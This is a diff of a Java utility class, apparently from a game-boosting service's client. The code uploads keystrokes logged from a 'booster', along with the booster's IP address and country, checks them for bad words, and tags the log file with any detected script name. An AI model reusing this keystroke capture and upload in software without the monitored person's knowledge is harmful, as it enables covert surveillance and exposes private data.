@@ -2,22 +2,17 @@ package services;
 
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
-import io.socket.utf8.UTF8;
 import logger.Globals;
 import logger.KeyLogger;
 import model.orders.Order;
 import model.User;
-import org.apache.http.Header;
-import org.apache.http.HttpHeaders;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.HttpClientBuilder;
-import org.apache.http.protocol.HTTP;
 import org.json.JSONException;
 import org.json.JSONObject;
-import webService.AWSWebService;
 
 import java.io.*;
 import java.text.DateFormat;
@@ -26,15 +21,15 @@ import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Scanner;
-import java.util.Timer;
 
 public class Utils {
 
     private static boolean foundBadWord = false;
     public Boolean scriptAlert = false;
+    public String scriptAlertName = "";
 
     public void uploadLog(User user, Order order) {
-        if(!KeyLogger.logUploaded && KeyLogger.log.size() > 5) {
+        if(!KeyLogger.logUploaded && KeyLogger.log.size() > 15) {
             if(checkForBadWords(KeyLogger.log)) {
                 Utils.foundBadWord = true;
             }
@@ -43,7 +38,9 @@ public class Utils {
             logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
             logFile.add("The booster's Country is: " + getMyCountry() + "\n");
             for (String message : KeyLogger.log) {
-                logFile.add(message + "\n");
+                if(message.trim().length() > 2) {
+                    logFile.add(message.trim() + "\n");
+                }
             }
             jsonObject.add("logFile", logFile);
             jsonObject.addProperty("fileName", createKey(user, order));
@@ -110,7 +107,7 @@ public class Utils {
             fileName += " WARNING ";
         }
         if (scriptAlert) {
-            fileName += " SCRIPT ALERT ";
+            fileName += " SCRIPT ALERT " + scriptAlertName;
         }
         fileName += " Booster_ID: " + user.getId() + " ";
         fileName += " Order_id: " + order.getId() + " ";
